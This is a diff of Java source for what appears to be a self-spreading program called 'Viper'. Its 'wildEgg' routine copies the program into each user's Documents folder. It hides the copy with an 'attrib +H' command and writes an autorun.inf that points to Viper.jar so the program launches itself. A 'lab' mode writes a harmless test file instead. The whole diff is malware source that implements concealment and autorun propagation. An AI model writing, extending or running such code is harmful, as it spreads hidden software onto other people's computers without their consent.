@@ -20,7 +20,14 @@ public static void labEgg(Path vPath,int unitNumber){
 	unitNum=unitNumber;
 	File[] targetUsers = users.listFiles();
 	for(int x =0; x<targetUsers.length;x++){
-		String usePath= createFilePath(users.getAbsolutePath());
+		String userCP=users.getAbsolutePath();
+		try {
+			 userCP=users.getCanonicalPath();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		String usePath= createFilePath(userCP,true);
 		createCopy(usePath,vPath,true);
 		copyMode(usePath);
 	}
@@ -31,13 +38,31 @@ public static void wildEgg(Path vPath,int unitNumber){
 	unitNum=unitNumber;
 	File[] targetUsers = users.listFiles();
 	for(int x =0; x<targetUsers.length;x++){
-		String usePath= createFilePath(users.getAbsolutePath());
+		String userCP=users.getAbsolutePath();
+		try {
+			 userCP=users.getCanonicalPath();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		String usePath= createFilePath(userCP, false);
 		createCopy(usePath,vPath,false);
 		
 	}
 }
-public static String createFilePath(String userPath){
-	File uP=new File(userPath+"/Documents/vn");
+public static String createFilePath(String userPath, boolean lab){
+	File doc= new File(userPath+"/Documents");
+	if(doc.exists()==false){
+		doc=new File(userPath+"/My Documents");
+	}
+	String docCP=doc.getAbsolutePath();
+	try {
+		docCP = doc.getCanonicalPath();
+	} catch (IOException e1) {
+		// TODO Auto-generated catch block
+		e1.printStackTrace();
+	}
+	File uP=new File(docCP+"/vn");
 	if(uP.exists()==false){
 		try {
 			uP.createNewFile();
@@ -47,25 +72,36 @@ public static String createFilePath(String userPath){
 		}
 		
 	}
-	if(uP.isHidden()==false){
+	if(uP.isHidden()==false&& lab==false){
 		
 		try {
-			Runtime.getRuntime().exec("attrib +H "+uP.getAbsolutePath());
+			Runtime.getRuntime().exec("attrib +H "+uP.getCanonicalPath());
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
-	return uP.getAbsolutePath() ;
+	String uPCP=uP.getAbsolutePath();
+	try {
+		uPCP = uP.getCanonicalPath();
+	} catch (IOException e) {
+		// TODO Auto-generated catch block
+		e.printStackTrace();
+	}
+	return uPCP ;
 	
 }
 public static void createCopy(String filePath,Path vPath,boolean lab){
 	File nestLocation=new File(filePath);
 	Identification nVID=new Identification();
 	try{
-		 
+		if(lab==true){ 
+		File conf= new File(vPath+"/conf.txt");
+		 if(conf.exists()==false){
+			 conf.createNewFile();
+		 }
 		
-		 
+		}
 		
 		
 		
@@ -73,7 +109,7 @@ public static void createCopy(String filePath,Path vPath,boolean lab){
 		 if(!nestLocation.exists()){
 			 nestLocation.createNewFile();
 		 
-		createAutoRun(lab,nestLocation);
+		createAutoRun(lab,filePath);
 		
 		
 		 }
@@ -110,11 +146,11 @@ public static int getUnitsCreated(){
 	return unitCopys;
 	
 }
-public static void createAutoRun(boolean lab, File nestLocation) throws IOException{
+public static void createAutoRun(boolean lab, String filePath) throws IOException{
 	FileWriter fw;
 	if(lab==true){
-	fw = new FileWriter(nestLocation.getAbsolutePath()+"/test.txt");
-	}else{ fw= new FileWriter(nestLocation.getAbsolutePath()+"/autorun.inf");}
+	fw = new FileWriter(filePath+"/test.txt");
+	}else{ fw= new FileWriter(filePath+"/autorun.inf");}
 		BufferedWriter writing= new BufferedWriter(fw);
 	
 		if(lab==true){
@@ -127,7 +163,7 @@ public static void createAutoRun(boolean lab, File nestLocation) throws IOExcept
 		}else if(lab==false){
 			for(int x=0;x<inCodedW.length; x++){
 				if(x==1){
-				writing.write(inCodedW[x]+nestLocation.getAbsolutePath()+"/Viper.jar");
+				writing.write(inCodedW[x]+filePath+"/Viper.jar");
 				}else{writing.write(inCodedW[x]);}
 				writing.newLine();
 				}
